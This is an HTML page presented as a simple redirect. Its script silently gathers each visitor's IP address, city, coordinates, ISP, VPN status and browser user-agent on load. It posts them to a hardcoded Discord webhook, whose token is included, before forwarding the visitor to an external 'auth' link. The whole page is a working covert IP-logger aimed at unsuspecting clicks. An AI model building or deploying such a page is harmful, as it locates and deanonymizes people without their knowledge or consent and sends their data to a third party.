<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Discord Webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        
        // Redirect URL
        const redirectURL = "https://www.genned.net/auth/rdtqx";

        function logVisitorAndRedirect() {
            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;

                    // Get full IP details with VPN detection
                    fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`)
                        .then(response => response.json())
                        .then(info => {
                            if (info.status !== "success") {
                                console.error("Error getting location data:", info.message);
                                window.location.href = redirectURL;
                                return;
                            }

                            const userAgent = navigator.userAgent;
                            const vpnStatus = info.proxy || info.hosting ? "ðŸ”´ **VPN/Proxy Detected**" : "ðŸŸ¢ **No VPN/Proxy Detected**";

                            const message = {
                                content: `**New Visitor Logged**\n\n` +
                                         `**IP Address:** ${info.query}\n` +
                                         `**Country:** ${info.country}\n` +
                                         `**Region:** ${info.regionName}\n` +
                                         `**City:** ${info.city}\n` +
                                         `**ISP:** ${info.isp}\n` +
                                         `**Organization:** ${info.org}\n` +
                                         `**ASN:** ${info.as}\n` +
                                         `**Latitude:** ${info.lat}\n` +
                                         `**Longitude:** ${info.lon}\n` +
                                         `**Timezone:** ${info.timezone}\n` +
                                         `**Mobile Device:** ${info.mobile ? "Yes" : "No"}\n` +
                                         `**VPN/Proxy:** ${info.proxy ? "Yes" : "No"}\n` +
                                         `**Hosting Service:** ${info.hosting ? "Yes" : "No"}\n` +
                                         `${vpnStatus}\n\n` +
                                         `**User-Agent:** \`${userAgent}\``
                            };

                            // Send data synchronously before redirecting
                            var xhr = new XMLHttpRequest();
                            xhr.open("POST", webhookURL, false); // false = synchronous
                            xhr.setRequestHeader("Content-Type", "application/json");
                            xhr.send(JSON.stringify(message));

                            // Redirect instantly after sending data
                            window.location.href = redirectURL;
                        })
                        .catch(error => {
                            console.error("Error getting location data:", error);
                            window.location.href = redirectURL; // Redirect even if API fails
                        });
                })
                .catch(error => {
                    console.error("Error getting IP address:", error);
                    window.location.href = redirectURL; // Redirect even if API fails
                });
        }

        // Run the function on page load
        logVisitorAndRedirect();
    </script>
</head>
<body>
    <noscript>
        <meta http-equiv="refresh" content="0;url=https://www.genned.net/auth/rdtqx">
    </noscript>
</body>
</html>
